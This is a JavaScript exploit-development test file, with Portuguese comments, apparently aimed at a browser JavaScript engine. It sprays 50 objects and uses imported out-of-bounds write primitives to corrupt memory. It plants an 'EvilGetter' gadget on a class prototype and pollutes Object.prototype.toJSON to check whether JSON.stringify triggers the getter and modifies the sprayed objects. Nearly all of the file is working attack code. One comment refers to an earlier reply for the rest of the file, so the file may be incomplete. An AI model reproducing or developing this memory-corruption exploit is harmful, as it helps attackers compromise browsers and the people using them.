// js/script3/testMyComplexObjectGetterRepro.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
// A linha abaixo é a crítica para este erro:
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// ... (resto do arquivo como fornecido na minha resposta anterior) ...

const GADGET_PROPERTY_NAME = "AAAA_GetterRepro";
export let getter_repro_called_flag = false;
export let getter_repro_this_id_logged = null;
export let getter_repro_this_marker_original = null;
export let getter_repro_this_marker_modified = null;

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean_prop";
        this.propA = "valA";
        this.propB = 23456;
        this.propC = null;
        this.propD = { nested: "valD" };
        this.propE = [1,2,3];
    }
}

export function toJSON_TriggerGetterViaForIn() {
    const FNAME_toJSON = "toJSON_TriggerGetterViaForIn";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    let error_in_loop = null;

    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObject.prototype.hasOwnProperty(prop)) {
                    if (typeof this[prop] !== 'function' || prop === GADGET_PROPERTY_NAME) {
                        returned_payload[prop] = this[prop];
                    }
                }
                if (iteration_count > 100) {
                    logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
                    returned_payload._LOOP_BREAK_ = iteration_count;
                    break;
                }
            }
        } else {
            returned_payload._ERROR_ = "this is not an object or is null";
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO no loop for...in: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        error_in_loop = `${e.name}: ${e.message}`;
        if (returned_payload) returned_payload._ERROR_IN_LOOP_ = error_in_loop;
    }

    if (returned_payload && iteration_count > 0) {
        returned_payload._iterations_ = iteration_count;
    }
    return returned_payload;
}

export async function executeGetterTriggerReproTest() {
    const FNAME_TEST = "executeGetterTriggerReproTest";
    logS3(`--- Iniciando Teste: Tentativa de Reproduzir Acionamento do Getter em MyComplexObject ---`, "test", FNAME_TEST);
    document.title = `Repro MyComplex Getter`;

    getter_repro_called_flag = false;
    getter_repro_this_id_logged = null;
    getter_repro_this_marker_original = null;
    getter_repro_this_marker_modified = null;
    let getter_this_details_log = ""; // Movido para dentro para resetar

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() {
                const GETTER_FNAME = "MyComplexObject_EvilGetter_Repro";
                logS3(`!!!! GETTER '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}`, "vuln", GETTER_FNAME);
                getter_repro_called_flag = true;
                getter_repro_this_id_logged = this.id;
                getter_this_details_log = `[${GETTER_FNAME}] Getter Chamado! this.id: ${this.id}. `;
                try {
                    getter_this_details_log += `instanceof MyComplexObject: ${this instanceof MyComplexObject}. `;
                    getter_this_details_log += `toString.call(this): ${Object.prototype.toString.call(this)}. `;

                    getter_repro_this_marker_original = this.marker;
                    this.marker = 0xAC717EDD;
                    getter_repro_this_marker_modified = this.marker;
                    getter_this_details_log += `Marker modificado de ${toHex(getter_repro_this_marker_original)} para ${toHex(getter_repro_this_marker_modified)}.`;

                    this.value1 = 111;
                    this.value2 = "getter_was_here";
                    this.newPropertyFromGetterRepro = "added_by_repro_getter";

                    logS3(getter_this_details_log, "vuln", GETTER_FNAME);

                } catch (e_getter_mod) {
                    const getter_err_msg = `   [${GETTER_FNAME}] ERRO ao operar em this: ${e_getter_mod.name} - ${e_getter_mod.message}`;
                    logS3(getter_err_msg, "error", GETTER_FNAME);
                    // getter_this_details_log += getter_err_msg; // Não precisa adicionar ao log global se já logou
                }
                return "value_returned_by_getter";
            },
            configurable: true,
            enumerable: true
        });
        getterPollutionApplied = true;
        logS3("Getter definido com sucesso.", "good", FNAME_TEST);
    } catch (e_getter_setup) {
        logS3(`ERRO ao definir getter: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return { errorOccurred: e_getter_setup };
    }

    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`Spray error: ${e_spray.message}`, "error", FNAME_TEST);
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) { // Check if property exists before deleting
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: e_spray };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("OOB setup error", "error", FNAME_TEST);
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
             if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
             else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: new Error("OOB Setup Failed") };
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: e_write };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`3. Sondando objetos pulverizados com ${toJSON_TriggerGetterViaForIn.name}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_summary = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerGetterViaForIn,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            getter_repro_called_flag = false;
            getter_repro_this_id_logged = null;
            getter_repro_this_marker_original = null;
            getter_repro_this_marker_modified = null;
            
            const original_marker_before_stringify = obj.marker;

            document.title = `Sondando MyComplexObject ${i}`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Marker Original: ${toHex(original_marker_before_stringify)}`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                if (stringifyResult && stringifyResult._ERROR_IN_LOOP_) {
                    errorDuringStringify = new Error(stringifyResult._ERROR_IN_LOOP_);
                }
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }

            if (getter_repro_called_flag) {
                logS3(`   !!!! SUCESSO: Getter '${GADGET_PROPERTY_NAME}' FOI CHAMADO para obj.id=${getter_repro_this_id_logged} !!!!`, "vuln", FNAME_TEST);
                // getter_this_details_log já foi logado dentro do getter
                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)}`, "info", FNAME_TEST);
                if (obj.marker === 0xAC717EDD) {
                    logS3(`        CONFIRMADO: Objeto sprayed_objects[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter e a modificação persistiu!`, "critical", FNAME_TEST);
                    document.title = `SUCCESS: Getter Called & Prop Modified on ${obj.id}!`;
                } else {
                     logS3(`        AVISO: Modificação do getter não persistiu ou foi sobrescrita. Original: ${toHex(original_marker_before_stringify)}, Getter setou para: ${toHex(getter_repro_this_marker_modified)}, Final: ${toHex(obj.marker)}`, "warn", FNAME_TEST);
                }
                problem_detected_summary = "Getter Acionado e Modificação Verificada";
                break;
            }
            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} ${errorDuringStringify.message ? `- ${errorDuringStringify.message}`:''}`, "error", FNAME_TEST);
                problem_detected_summary = `Erro: ${errorDuringStringify.name}`;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu. O loop for...in ainda é instável sob estas condições.", "warn", FNAME_TEST);
                }
                break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        problem_detected_summary = "Erro no Loop Principal";
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (getter_repro_called_flag) {
        logS3("Teste CONCLUÍDO: O Getter FOI ACIONADO!", "vuln", FNAME_TEST);
    } else if (problem_detected_summary) {
        logS3(`Teste CONCLUÍDO: Um problema (${problem_detected_summary}) ocorreu durante a sondagem.`, "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Getter não acionado e nenhum erro óbvio nos objetos sondados.", "good", FNAME_TEST);
    }

    if (getterPollutionApplied) { // Deve ser getterPollutionAppliedOnMyComplex
        if (MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) { // Checa se a propriedade ainda existe
            if (originalGetterDescriptor) {
                Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            } else {
                delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
            }
            logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
        }
    }

    logS3(`--- Teste Tentativa de Reproduzir Acionamento do Getter CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = getter_repro_called_flag ? document.title : (problem_detected_summary ? document.title : `Repro Getter Done`);
}
